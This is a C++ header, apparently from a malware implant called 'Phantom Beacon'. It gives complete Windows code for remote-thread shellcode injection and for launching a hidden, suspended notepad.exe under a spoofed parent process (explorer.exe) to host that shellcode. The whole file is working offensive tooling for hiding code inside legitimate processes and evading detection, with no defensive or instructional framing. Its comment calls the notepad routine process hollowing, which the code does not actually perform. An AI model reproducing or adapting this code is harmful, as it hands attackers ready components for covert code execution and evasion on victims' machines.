#pragma once
// ============================================================================
//  injection.h — Phantom Beacon Process Injection (Windows Only)
//  ──────────────────────────────────────────────────────────────
//  Implements Process Hollowing and Remote Thread Injection with PPID Spoofing.
// ============================================================================

#ifdef _WIN32
#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <string>

namespace injection {

// Helper to get PID by name
inline DWORD get_process_id_by_name(const std::string& name) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);
        if (Process32First(hSnapshot, &pe)) {
            do {
                if (name == pe.szExeFile) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

// Remote Thread Injection
inline bool inject_shellcode(DWORD pid, const std::vector<unsigned char>& shellcode) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return false;

    LPVOID pRemoteBuf = VirtualAllocEx(hProcess, nullptr, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteBuf) {
        CloseHandle(hProcess);
        return false;
    }

    if (!WriteProcessMemory(hProcess, pRemoteBuf, shellcode.data(), shellcode.size(), nullptr)) {
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)pRemoteBuf, nullptr, 0, nullptr);
    if (!hThread) {
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}

// Simple Process Hollowing (spawns notepad.exe and injects) with PPID Spoofing
inline bool migrate_to_new_process(const std::vector<unsigned char>& shellcode) {
    STARTUPINFOEXA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    SIZE_T attributeListSize = 0;

    // 1. Get a handle to a target parent process (e.g., explorer.exe)
    DWORD ppid = get_process_id_by_name("explorer.exe");
    if (ppid == 0) ppid = GetCurrentProcessId(); // Fallback

    HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ppid);
    if (!hParent) return false;

    // 2. Initialize attribute list for PPID spoofing
    InitializeProcThreadAttributeList(nullptr, 1, 0, &attributeListSize);
    si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeListSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeListSize);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), nullptr, nullptr);

    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_HIDE;

    // 3. Create process with the spoofed parent
    if (!CreateProcessA(nullptr, (LPSTR)"notepad.exe", nullptr, nullptr, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW, nullptr, nullptr, &si.StartupInfo, &pi)) {
        CloseHandle(hParent);
        DeleteProcThreadAttributeList(si.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        return false;
    }

    bool success = inject_shellcode(pi.dwProcessId, shellcode);
    
    if (success) ResumeThread(pi.hThread);
    else TerminateProcess(pi.hProcess, 0);

    DeleteProcThreadAttributeList(si.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
    CloseHandle(hParent);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return success;
}

} // namespace injection
#endif
